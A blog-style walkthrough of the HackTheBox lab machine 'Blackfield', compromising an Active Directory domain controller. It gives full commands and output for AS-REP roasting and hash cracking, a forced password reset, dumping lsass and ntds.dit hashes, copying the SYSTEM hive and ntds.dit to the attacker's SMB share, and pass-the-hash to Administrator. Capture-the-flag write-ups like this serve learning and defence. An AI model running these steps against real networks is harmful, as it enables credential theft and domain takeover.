---
layout: post
title: Blackfield
subtitle: Resolute HackTheBox
cover-img: /assets/img/htb-bg.png
thumbnail-img: /assets/img/Blackfield_Big.png
share-img: /assets/img/path.jpg
tags: [Active Direcotry, Windows]
---
<img src="https://github.com/susMdT/secondsite.github.io/blob/dev-pages/assets/img/Blackfield_Release.jpg?raw=true" class="mx-auto d-block" unselectable="on" />
Blackfield is a hard level box on HackTheBox and requires basic Active Directory knowledge and enumeration skills to solve. The user part was rather lengthy, but with the use of Bloodhound, the path to root becomes clear very early on.

## Walkthrough

A basic and full port nmap scan, followed by a script scan on the ports found reveals the following information

```
┌──(root💀kali)-[/home/kali/HackTheBox/Blackfield]
└─# nmap -p 53,88,139,139,389,445,593,3268 -sVC blackfield.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-05 20:37 EST
WARNING: Duplicate port number(s) specified.  Are you alert enough to be using Nmap?  Have some coffee or Jolt(tm).
Nmap scan report for blackfield.htb (10.10.10.192)
Host is up (0.19s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-06 08:52:12Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2021-12-06T08:52:22
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 7h14m17s

```

The open Kerberos and DNS services imply that this box is likely to be a domain controller. Enumeration via `enum4linux` is unsuccessful, but we do have anonymous access to some SMB shares. While the IPC$ share is empty, the profiles$ share seems interesting and is actually filled with folders of what seem to be usernames in a first initial + last name naming format.

```
┌──(root💀kali)-[/home/kali/HackTheBox/Blackfield]
└─# smbmap -H 10.10.10.192 -u 'root' -p ''     
[+] Guest session       IP: 10.10.10.192:445    Name: blackfield.htb                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                NO ACCESS       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
        
       
       
┌──(root💀kali)-[/home/kali/HackTheBox/Blackfield]                                                     
└─# smbclient \\\\10.10.10.192\\profiles$ -U ''
Enter WORKGROUP\'s password:                                                                           
Try "help" to get a list of possible commands.                                                         
smb: \> ls                                                                                             
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  //and so on. Theres like 300 more
  
  
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *

```

After doing a recursive download of all the files and directories, it becomes clear that the real interesting thing to note is the actual folders, not their nonexistent contents. They fit the candidate for potential usernames, so we can compile them into a wordlist and then attempt to spray them with weak credentials or use an AS-REP Roasting attack (since Kerberos is running, its worth a shot.). When I ran the recursive download on smbclient, all the folders were placed in the directory I ran smbclient in. This allowed me to just compile a wordlist using `ls > userlist`. With the userlist compiled, let's start with an AS-REP Roast.

```
┌──(root💀kali)-[/home/kali/HackTheBox/Blackfield]                                                     
└─# GetNPUsers.py BLACKFIELD.local/AAlleni -dc-ip 10.10.10.192 -usersfile userlist

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:6c4abb99a36faa761188bf7118998eb1$1e2c1afa5619bcee910235a29447654c66fc1dfeb415562db72a23aec206578c0482e32d03f38e5912f9994c9e88528f7e581b70998dbf1dd349375b352f095679c8be7726320857e77eba96c449868979412296fbec8c9848ced7cff89056e3a3efb8dcd50c1893dc34fe2df84875d4745d8dca718f60cd7353e141c7dc9d51a69cf85a3ee788a35eb4099577f2c026ac3fd6b8127ed78d2d487a9bda31d4fd65b5984fa0116f8c47549713c1421672f70be43383d6d76bc9ddc93760eff85b62dc4e100829241a5e777793dbb502c7f6db7a1c0cada3b71c80f7a6bfe07f78f2cfec5b43fa489f3df7cfd743e64f2bd5b30851
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set

```

While many of the usernames were actually invalid, we did find three valid users (svc_backup, audit2020, and support), and a hash for one. Something to note is the audit user; previously, when we enumerated SMB shares, there was a "forensic" folder that this audit user likely has access to. Moving on, we can crack the hash with hashcat on mode 18200 after writing the hash to a file, and this yields us the following information

```
┌──(root💀DESKTOP-VBI49KD)-[/mnt/d/Downloads]
└─# hashcat -a 0 -m 18200 hash /usr/share/wordlists/rockyou.txt --force

$krb5asrep$23$support@BLACKFIELD.LOCAL:6c4abb99a36faa761188bf7118998eb1$1e2c1afa5619bcee910235a29447654c66fc1dfeb415562db72a23aec206578c0482e32d03f38e5912f9994c9e88528f7e581b70998dbf1dd349375b352f095679c8be7726320857e77eba96c449868979412296fbec8c9848ced7cff89056e3a3efb8dcd50c1893dc34fe2df84875d4745d8dca718f60cd7353e141c7dc9d51a69cf85a3ee788a35eb4099577f2c026ac3fd6b8127ed78d2d487a9bda31d4fd65b5984fa0116f8c47549713c1421672f70be43383d6d76bc9ddc93760eff85b62dc4e100829241a5e777793dbb502c7f6db7a1c0cada3b71c80f7a6bfe07f78f2cfec5b43fa489f3df7cfd743e64f2bd5b30851:
#00^BlackKnight
```

Now that we have valid credentials, we can use Evil-WinRM to get remote access through the WinRM service.

```
┌──(root💀kali)-[/home/kali]
└─# evil-winrm -i 10.10.10.192 -u 'support' -p '#00^BlackKnight' 

Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
Error: Exiting with code 1
```

Turns out this doesn't work. This is likely because this user isn't in the "Remote Management Users" group, which is needed if a user is to try to gain access through the WinRM service. In other words, the service can only be used by users in that group. We can confirm this by running bloodhound (plus this helps us enumerate even further, now that we have access to an actual user).

```
┌──(root💀kali)-[/home/kali/HackTheBox/Blackfield]
└─# python /usr/local/bin/bloodhound-python -u 'support' -p '#00^BlackKnight' -ns 10.10.10.192 -d BLACKFIELD.LOCAL -c all                                                                                  
INFO: Found AD domain: blackfield.local
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 315 users
INFO: Connecting to GC LDAP server: dc01.blackfield.local
INFO: Found 51 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done in 00M 17S
```

It turns out we're correct. Checking for information on the other users we found yields the following graphs

<img src="https://github.com/susMdT/Nigerald/blob/master/assets/images/Blackfield_Bloodhound.PNG?raw=true" class="postImagecontent" width="100%" height="100%" unselectable="on" />

First thing to note is that our user, support, can change the password for the user audit2020. There is also another user, svc_backup, which is in the Backup Operators group. Members of this group usually have the SeBackupPivilege and SeRestorePrivilege, allowing them to read any files. Since we want to obtain control over the domain, we would read the NTDS.dit and the System hive (more on this later). To start our attack path, lets start by resetting the password of audit2020. While we don't have code exeuction on the computer to do this, we can use the MSRPC service to our advantage. 

```
┌──(root💀kali)-[/home/kali/GithubTools/impacket]
└─# rpcclient -U 'support%#00^BlackKnight' 10.10.10.192                                                             
rpcclient $> setuserinfo audit2020 23 'OrbitalNumber1'

//The 23 specifies the command to use the privilege information of the user we authenticated as, and because user //support has the privilege to overwrite the audit user's password, this works.
```

Our suspicions from earlier turn out to be true; we can read from the forensic share.

```
┌──(root💀kali)-[/home/kali/HackTheBox/Blackfield]
└─# smbmap -H 10.10.10.192 -u 'audit2020' -p 'OrbitalNumber1'
[+] IP: 10.10.10.192:445        Name: blackfield.htb                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                READ ONLY       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share
```

While trying to exfiltrate the files from the share, they turned out to be too large so I ended up just mounting the share onto my own host.

```
┌──(root💀kali)-[/home/kali/HackTheBox/Blackfield]
└─# mount //10.10.10.192/forensic ./tmp/ -o username=audit2020 
Password for audit2020@//10.10.10.192/forensic:

┌──(root💀kali)-[/home/kali/HackTheBox/Blackfield]                                                     
└─# ls -laR tmp/* 
                                                                                                       
tmp/memory_analysis:                                                                                   
total 506004                                                                                           
drwxr-xr-x 2 root root         0 May 28  2020 .                                                        
drwxr-xr-x 2 root root      4096 Feb 23  2020 ..                                                       
-rwxr-xr-x 1 root root  37876530 May 28  2020 conhost.zip                                              
-rwxr-xr-x 1 root root  24962333 May 28  2020 ctfmon.zip                           
-rwxr-xr-x 1 root root  23993305 May 28  2020 dfsrs.zip                                                
-rwxr-xr-x 1 root root  18366396 May 28  2020 dllhost.zip                       
-rwxr-xr-x 1 root root   8810157 May 28  2020 ismserv.zip                                
-rwxr-xr-x 1 root root  41936098 May 28  2020 lsass.zip                              
-rwxr-xr-x 1 root root  64288607 May 28  2020 mmc.zip                                                  
-rwxr-xr-x 1 root root  13332174 May 28  2020 RuntimeBroker.zip                                        
-rwxr-xr-x 1 root root 131983313 May 28  2020 ServerManager.zip                                        
-rwxr-xr-x 1 root root  33141744 May 28  2020 sihost.zip                     
-rwxr-xr-x 1 root root  33756344 May 28  2020 smartscreen.zip                                          
-rwxr-xr-x 1 root root  14408833 May 28  2020 svchost.zip
-rwxr-xr-x 1 root root  34631412 May 28  2020 taskhostw.zip
-rwxr-xr-x 1 root root  14255089 May 28  2020 winlogon.zip
-rwxr-xr-x 1 root root   4067425 May 28  2020 wlms.zip
-rwxr-xr-x 1 root root  18303252 May 28  2020 WmiPrvSE.zip
..a lot more files
```

The most interesting file here is the lsass.zip. Lsass is a built in Windows service that manages the security policies, the verification of logins, and other authentication related processes. We don't have write access in the share, but we can just copy it out of the share and extract it via `cp lsass.zip /path/to/some/directory && 7z e /path/to/copy`. This nets us a Mini DuMP dump file that we will extract information from using the tool pypykatz (we can install this simply with pip3 install pypykatz).

```
┌──(root💀kali)-[/home/kali/HackTheBox/Blackfield]                                                     
└─# pypykatz lsa minidump lsass.DMP
//I'm going to filter the intersting bits.
INFO:root:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======                                                                       
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c   
        == MSV ==                                  
                Username: DC01$
                Domain: BLACKFIELD                                                                     
                LM: NA                                                                                 
                NT: b624dc83a27cc29da11d9bf25efea796                                                   
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == MSV ==
                Username: Administrator
                Domain: BLACKFIELD
                LM: NA
                NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
                SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368    
```

We can simply test if these hashes are valid by passing the NT hash into Evil-WinRM. Only the svc_backup account is able to authenticate.

```
┌──(root💀kali)-[/home/kali/HackTheBox/Blackfield]
└─# evil-winrm -i 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'

Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents> 
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

We're in! And we also have both of the privileges needed for our Privilege Escalation that I detailed earlier. When a computer is a Domain Controller in an AD network, the local accounts are disabled, so we if want Admin access, we need the Ntds.dit file. Additionally, the key needed to decrypt this and actually extract information is located in the System hive (a group of keys, subkeys, and values located in the registry). However, because the Ntds is always in use, we cannot simply just make a backup of it. To start our attack process, we will create a dsh (Diskshadow script); the Diskshadow tool can create shadow files, which are like snapshots. For convenience and mitigation of potential errors, we will script out our commands. We will create a .dsh and input the following lines of code:

```
┌──(root💀kali)-[/home/kali/HackTheBox/Blackfield]
└─# nano bruh.dsh

//in the file
set context persistent nowriters
add volume c: alias bruh
create
expose %bruh% d:

//Now encode the file to the correct format
┌──(root💀kali)-[/home/kali/HackTheBox/Blackfield]
└─# unix2dos bruh.dsh
unix2dos: converting file bruh.dsh to DOS format...
```

In this script, we are creating a copy of the C: drive, aliasing as "bruh", and then creating a D drive based on "bruh". Additionally, this D drive will remain even after the Diskshadow program is done running. Now we upload the file in our Evil-WinRM session and then copy (using robocopy, since normal copy won't take into account our privileges). While theoretically we could just use robocopy to read the root flag and not do all this extra stuff, we're here for Administrator, not the flag.

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> upload bruh.dsh
*Evil-WinRM* PS C:\> mkdir Tmp

    Directory: C:\
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        12/6/2021  10:38 AM                Tmp

*Evil-WinRM* PS C:\> cd Tmp
*Evil-WinRM* PS C:\Tmp> diskshadow /s C:\Users\svc_backup\Documents\bruh.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  12/6/2021 10:38:22 AM

-> set context persistent nowriters
-> add volume c: alias bruh
-> create
Alias bruh for shadow ID {19b94ea2-ef16-485a-9023-0c64f17a766e} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {2ab08ddb-2f6c-4e42-a03e-b4cafa37f7f9} set as environment variable.

Querying all shadow copies with the shadow copy set ID {2ab08ddb-2f6c-4e42-a03e-b4cafa37f7f9}

        * Shadow copy ID = {19b94ea2-ef16-485a-9023-0c64f17a766e}               %bruh%
                - Shadow copy set: {2ab08ddb-2f6c-4e42-a03e-b4cafa37f7f9}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 12/6/2021 10:38:23 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %bruh% d:
-> %bruh% = {19b94ea2-ef16-485a-9023-0c64f17a766e}
The shadow copy was successfully exposed as d:\.
->

```

I had to create a directory and run the script in the new directory because I ran into issues regarding write access in the directory that I ran the script in. Now that we have a copy of Ntds.dit that isn't in constant use, we can copy it with robocopy.

```
//We are copying the snapshot of ntds into our own directory under the name ntds.dit 
//the /b flag tells it to utilize our SeBackupPrivilege
*Evil-WinRM* PS C:\Tmp> robocopy /b d:\windows\ntds . ntds.dit 
100%
------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   18.00 m   18.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00

```

Now that we have our data, we need the key (the system hive).

```
*Evil-WinRM* PS C:\Tmp> reg save hklm\system system
The operation completed successfully
```

Now we just have to download both files for offline cracking with secretsdump.py, a tool apart of impacket.

```
//Normally you could just use "download <filename" in Evil-WinRM, but it wasn't working so I spun up an SMB server and copied them there
//Also, the server had smb2support enabled because the machine noticed that my SMB server was insecure

┌──(root💀kali)-[/home/kali/HackTheBox/Blackfield]
└─# smbserver.py share . -smb2support
Impacket v0.9.24.dev1+20210928.152630.ff7c521a - Copyright 2021 SecureAuth Corporation

*Evil-WinRM* PS C:\Tmp> copy ntds.dit \\10.10.16.6\share\ntds.dit
*Evil-WinRM* PS C:\Tmp> copy system  \\10.10.16.6\share\system

//I use local to make the script know that its just parsing files
┌──(root💀kali)-[/home/kali/HackTheBox/Blackfield]
└─# secretsdump.py -ntds ntds.dit -system system local                                                                                   
Impacket v0.9.24.dev1+20210928.152630.ff7c521a - Copyright 2021 SecureAuth Corporation
[*] Target system bootKey: 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:3774928fe55833e6c62abdc233f47a7b:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
```

And now we just have to pass the NTLM hash (the hash on the right of the colon), and we win.

```
┌──(root💀kali)-[/home/kali/HackTheBox/Blackfield]
└─# evil-winrm -i 10.10.10.192 -u 'Administrator' -H '184fb5e5178480be64824d4cd53b99ee'

Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
blackfield\administrator
```

## Afterthoughts

This box was super fun; not too difficult and brain draining, but long and memorable enough to learn some things. Bloodhound really stuck out to me on this one, as I was able to essentially map my entire attack path very early on. The entire attack chain made sense, and enumeration was essential; however, because of Bloodhound, enumeration was extremely easy because everything else was noticeably out of place (such as the forensic share having a description that included the name of an account in SMB).

-Dylan Tran 12/6/21
